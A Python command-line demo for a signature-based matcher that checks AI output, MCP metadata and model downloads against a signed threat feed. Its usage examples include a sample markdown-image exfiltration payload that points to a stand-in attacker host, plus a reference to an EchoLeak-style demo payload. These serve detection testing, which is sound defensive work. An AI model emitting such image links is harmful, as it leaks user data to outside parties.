#!/usr/bin/env python3
"""Scan an event against the feed and print the decision (reference matcher demo).

Loads signatures from a signed bundle (verified first) or straight from
signatures/ (+ optional pending/), builds one Event, and prints the strongest
action plus every signature hit with its evidence.

Examples:
  # text on the output surface, from signatures/ (feed v1)
  uv run --python 3.13 --with google-re2 --with pyyaml python scan.py \
      --surface output --text "![p](https://exfil.evil.example/c?d=QUJD)"

  # the demo payload before vs after publishing the pending signature
  ... scan.py --surface output --file demo/echoleak-proxy-payload.md
  ... scan.py --surface output --file demo/echoleak-proxy-payload.md --include-pending

  # against the signed+verified bundle
  ... scan.py --from-bundle --surface mcp --json '{"authorization_endpoint":"http://a.example/x"}'

  # a model file
  ... scan.py --surface model_download --filename m.bin --bytes-file ./some.bin
"""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import feedlib as fl  # noqa: E402

SIG_DIR = fl.ROOT / "signatures"
PENDING_DIR = fl.ROOT / "pending"
DIST = fl.ROOT / "dist"
PUB = fl.ROOT / "keys" / "feed-public.key"


def load_from_bundle() -> tuple[list[dict], int]:
    import hashlib

    pub = fl.read_hex_key(PUB)
    latest = json.loads((DIST / "latest.json").read_text())
    fl.verify_document(latest, pub)
    data = (DIST / latest["bundle"]).read_bytes()
    if hashlib.sha256(data).hexdigest() != latest["sha256"]:
        raise SystemExit("bundle sha256 mismatch; run verify.py")
    bundle = json.loads(data)
    fl.verify_document(bundle, pub)
    return bundle["signatures"], bundle["serial"]


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--surface", required=True, choices=fl.SURFACES)
    ap.add_argument("--text")
    ap.add_argument("--json", dest="json_str")
    ap.add_argument("--url")
    ap.add_argument("--method")
    ap.add_argument("--body")
    ap.add_argument("--filename")
    ap.add_argument("--file", type=Path, help="read --text from this file")
    ap.add_argument("--bytes-file", type=Path, help="read artifact bytes from this file")
    ap.add_argument("--from-bundle", action="store_true", help="load the signed+verified bundle instead of source YAML")
    ap.add_argument("--include-pending", action="store_true", help="also load pending/ (source mode)")
    ap.add_argument("--output-json", action="store_true")
    args = ap.parse_args(argv)

    if args.from_bundle:
        sigs, serial = load_from_bundle()
        source = f"signed bundle serial {serial}"
    else:
        paths = sorted(SIG_DIR.glob("*.y*ml"))
        if args.include_pending:
            paths += sorted(PENDING_DIR.glob("*.y*ml"))
        sigs = [fl.load_signature_file(p) for p in paths]
        source = f"source YAML ({'signatures+pending' if args.include_pending else 'signatures'})"
    compiled = [fl.compile_signature(s) for s in sigs]

    text = args.file.read_text(encoding="utf-8") if args.file else args.text
    data = args.bytes_file.read_bytes() if args.bytes_file else None
    kw = dict(surface=args.surface, text=text, url=args.url, method=args.method,
              body=args.body, filename=args.filename, data=data)
    if args.json_str:
        kw["json"] = json.loads(args.json_str)
    ev = fl.Event(**kw)
    decision, hits = fl.scan_event(compiled, ev)

    if args.output_json:
        print(json.dumps({"source": source, "surface": args.surface, "decision": decision, "hits": hits},
                         indent=2, ensure_ascii=False))
        return 0 if decision == "allow" else 3
    print(f"source:   {source}")
    print(f"surface:  {args.surface}")
    print(f"decision: {decision.upper()}")
    if not hits:
        print("no signature matched")
    for h in hits:
        mode = "" if h["mode"] == "enforce" else " [monitor]"
        print(f"  - {h['signature_id']} ({h['severity']}) -> {h['action']}{mode}: {h['message']}")
        for e in h["evidence"]:
            print(f"        {json.dumps(e, ensure_ascii=False)}")
    return 0 if decision == "allow" else 3


if __name__ == "__main__":
    sys.exit(main())
